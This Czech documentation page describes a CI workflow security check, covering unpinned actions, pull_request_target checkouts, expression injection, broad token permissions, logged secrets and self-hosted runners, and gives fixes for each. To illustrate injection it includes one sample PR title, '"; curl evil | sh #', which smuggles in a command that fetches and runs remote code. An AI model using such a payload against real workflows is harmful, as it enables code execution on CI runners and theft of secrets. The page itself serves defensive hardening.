# ci-security – Rizikové nastavení CI workflow

**Kategorie:** Bezpečnost · **Severity:** MEDIUM (některé nálezy HIGH) · **Automatická oprava:** jen připnutí akcí

## Co kontrola hledá

Projde `.github/workflows/*.yml`, `.forgejo/workflows/*.yml` a `.gitea/workflows/*.yml` (jen čte, nic z nich nespouští):

- **Akce nepřipnutá na commit SHA** – `uses: owner/action@v4` místo `@<40 hex>`. Medium; **high**, jde-li o akci třetí strany (mimo `actions/` a `github/`) ve workflow, které pracuje s tajemstvími. Lokální akce (`./…`) a vlastníci z `[ci] trusted_action_owners` se nehlásí.
- **`pull_request_target` s checkoutem kódu z PR** (`ref: ${{ github.event.pull_request.head.sha }}`) – high.
- **Injekce výrazu do `run:`** z polí, která ovládá autor PR nebo issue (`github.event.issue.title`, `…pull_request.title`, `github.head_ref`, `…comment.body` …) – high.
- **Široká oprávnění tokenu** – `permissions: write-all`, nebo chybějící `permissions` u workflow spouštěného cizími PR (`pull_request_target`, `workflow_run`, `issue_comment`) – medium.
- **Tajemství vypisovaná do logu** – `echo ${{ secrets.X }}`, nebo `set -x` v kroku, který pracuje s tajemstvím – medium.
- **`self-hosted` runner ve veřejném repu** (GitHub) – high.

## Proč to vadí

Tag akce (`@v4`) může autor akce – nebo útočník, který převezme jeho účet – kdykoli přesunout na jiný kód, a ten pak běží s přístupem k tvým tajemstvím (případ `tj-actions/changed-files`, 2025). `pull_request_target` běží s právy repa, takže checkout kódu z cizího PR mu tato práva předá. Výraz `${{ … }}` v `run:` se vloží do shellu dřív, než se spustí – název PR `"; curl evil | sh #` se tak vykoná. Self-hosted runner ve veřejném repu nechá cizí PR spustit kód na tvém stroji.

## Postup

1. **Připni akce na SHA** s tagem v komentáři: `uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4`. Léčba to udělá sama, pokud SHA zjistí přes API GitHubu (náhled diffu, commit do větve oprav). Aktualizace pak hlídá Dependabot / Renovate.
2. **`pull_request_target`:** nedělej checkout kódu z PR; pokud ho potřebuješ, použij `pull_request` (bez tajemství) a výsledek předej přes artefakt.
3. **Injekce:** předej hodnotu přes proměnnou prostředí a v shellu ji uvozovej:

   ```yaml
   - env:
       TITLE: ${{ github.event.pull_request.title }}
     run: echo "$TITLE"
   ```

4. **Oprávnění:** na začátek workflow `permissions: contents: read` a jobům přidávej jen to, co potřebují.
5. **Tajemství v logu:** nevypisuj je (`echo`), `set -x` vypni před prací s tajemstvím (`set +x`).
6. **Self-hosted runner:** ve veřejném repu ho nepoužívej, nebo vyžaduj schválení běhů z forků (Settings → Actions → *Require approval for all outside collaborators*).
